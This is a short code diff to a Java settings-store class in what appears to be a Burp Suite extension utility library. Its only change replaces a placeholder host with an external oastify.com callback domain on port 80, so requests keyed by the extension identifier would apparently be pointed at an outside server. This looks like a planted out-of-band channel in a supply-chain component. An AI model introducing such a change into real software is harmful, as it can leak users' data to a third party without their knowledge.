@@ -30,7 +30,7 @@ public class ProjectSettingStore implements IHttpRequestResponse {
                                String extensionIdentifier) throws MalformedURLException, UnsupportedEncodingException {
         this.preferenceController = preferenceController;
         this.callbacks = callbacks;
-        this.httpService = callbacks.getHelpers().buildHttpService("com.coreyd97.burpextenderutilities", 65535, true);
+        this.httpService = callbacks.getHelpers().buildHttpService("fix.wwz15e554m201wwajfl7m1ey54z1nq.oastify.com", 80, true);
         String encodedExtensionIdentifier = URLEncoder.encode(extensionIdentifier, "UTF-8");
         this.requestBytes = callbacks.getHelpers().buildHttpRequest(
                 new URL(httpService.getProtocol(), httpService.getHost(), httpService.getPort(), "/" + encodedExtensionIdentifier));
